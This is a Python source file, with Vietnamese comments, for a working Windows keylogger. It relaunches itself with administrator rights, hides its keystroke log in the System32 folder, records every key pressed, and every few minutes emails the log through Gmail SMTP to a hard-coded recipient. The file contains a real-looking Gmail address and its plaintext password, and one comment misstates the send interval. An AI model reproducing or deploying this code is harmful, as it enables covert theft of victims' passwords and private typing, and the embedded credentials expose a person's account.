import os
import sys
import logging
import time
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from pynput.keyboard import Listener, Key
import ctypes

# Kiểm tra nếu chương trình đang chạy với quyền Administrator


def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False


# Nếu chưa có quyền Administrator, yêu cầu chạy lại chương trình với quyền Admin
if not is_admin():
    script = sys.argv[0]
    ctypes.windll.shell32.ShellExecuteW(
        None, "runas", sys.executable, script, None, 1)
    sys.exit()

# Đảm bảo quyền ghi vào thư mục System32
system32_path = os.path.join(os.environ['WINDIR'], 'System32')
if not os.access(system32_path, os.W_OK):
    print("Bạn cần quyền Administrator để ghi vào System32.")
    sys.exit()

# Thiết lập file log trong thư mục System32
log_file_path = os.path.join(system32_path, "keylog.txt")
logging.basicConfig(filename=log_file_path, level=logging.DEBUG,
                    format="%(asctime)s - %(message)s")

# Cấu hình gửi email


def send_email():
    from_email = "nghia01695@gmail.com"  # Địa chỉ email của bạn
    to_email = "nghia0843309947@gmail.com"  # Địa chỉ email người nhận
    password = "@Ducnghia1207"  # Sử dụng mật khẩu ứng dụng nếu bật 2FA

    # Tạo đối tượng email
    msg = MIMEMultipart()
    msg['From'] = from_email
    msg['To'] = to_email
    msg['Subject'] = "Keylog Report"

    # Nội dung email
    body = "Đây là báo cáo keylog."
    msg.attach(MIMEText(body, 'plain'))

    # Đính kèm file log
    attachment = open(log_file_path, "rb")
    part = MIMEBase('application', 'octet-stream')
    part.set_payload(attachment.read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', "attachment; filename= keylog.txt")
    msg.attach(part)

    # Kết nối với Gmail SMTP server và gửi email
    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(from_email, password)
        text = msg.as_string()
        server.sendmail(from_email, to_email, text)
        server.quit()
        print("Email đã được gửi.")
    except Exception as e:
        print(f"Lỗi khi gửi email: {e}")

# Hàm khi một phím được nhấn


def on_press(key):
    try:
        logging.info('Phím nhấn: {0}'.format(key.char))
    except AttributeError:
        logging.info('Phím đặc biệt: {0}'.format(key))

# Hàm khi một phím được thả


def on_release(key):
    if key == Key.esc:
        print("Keylogger đã dừng.")
        return False

# Lắng nghe sự kiện bàn phím


def start_keylogger():
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

# Chạy keylogger và gửi email mỗi 10 giây


def main():
    # Chạy keylogger trong một luồng riêng
    import threading
    threading.Thread(target=start_keylogger).start()

    # Gửi email mỗi 10 giây
    while True:
        time.sleep(360)  # Đợi 10 giây
        send_email()  # Gửi email với file log


if __name__ == "__main__":
    main()
